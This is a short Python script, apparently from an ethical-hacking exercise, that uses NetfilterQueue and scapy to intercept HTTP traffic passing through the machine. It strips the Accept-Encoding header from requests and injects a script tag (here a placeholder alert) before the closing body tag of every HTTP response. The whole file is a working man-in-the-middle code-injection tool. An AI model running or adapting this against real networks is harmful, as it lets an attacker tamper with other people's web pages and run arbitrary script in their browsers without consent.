#!/usr/bin/env python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import re

ack_list = []


def set_load(packet, link):
    packet[scapy.Raw].load = link
    # print(packet.show())
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            packet_load = scapy_packet[scapy.Raw].load.decode('utf-8')
            # packet_load = scapy_packet[scapy.Raw].load
            # packet_rep = repr(packet_load)[2:-1]
            modified_load = re.sub('Accept-Encoding:.*?\\r\\n', '', packet_load)
            # print(modified_load)
            new_packet = set_load(scapy_packet, modified_load.encode('utf-8'))
            # new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(bytes(new_packet))
            # print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")
            packet_load = scapy_packet[scapy.Raw].load.decode('utf-8')
            # print(packet_load)
            modified_load = packet_load.replace("</body>", "<script>alert()</script></body>\n\n")
            new_packet = set_load(scapy_packet, modified_load.encode('utf-8'))
            packet.set_payload(bytes(new_packet))
            # print(scapy_packet.show())

        # print(scapy_packet.show())
    packet.accept()
    # packet.drop()


queue = NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
